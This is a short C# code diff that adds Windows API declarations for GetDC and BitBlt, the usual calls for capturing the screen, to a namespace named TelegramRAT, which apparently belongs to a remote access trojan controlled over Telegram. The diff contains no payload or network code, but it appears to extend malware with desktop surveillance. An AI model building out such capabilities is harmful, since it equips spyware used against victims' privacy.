@@ -162,5 +162,20 @@ namespace TelegramRAT
         [DllImport("Kernel32.dll", EntryPoint = "GetProcessId")]
         public static extern int GetProcessId(IntPtr procHandle);
 
+        [DllImport(u32, EntryPoint = "GetDC")]
+        public static extern IntPtr GetDC(IntPtr hWnd);
+
+        [DllImport("Gdi32.dll", EntryPoint = "BitBlt")]
+        public static extern bool BitBlt(
+            IntPtr destHdc,
+            int x,
+            int y,
+            int width,
+            int height,
+            IntPtr srcHdc,
+            int x1,
+            int y1,
+            int rop);
+
     }
 }
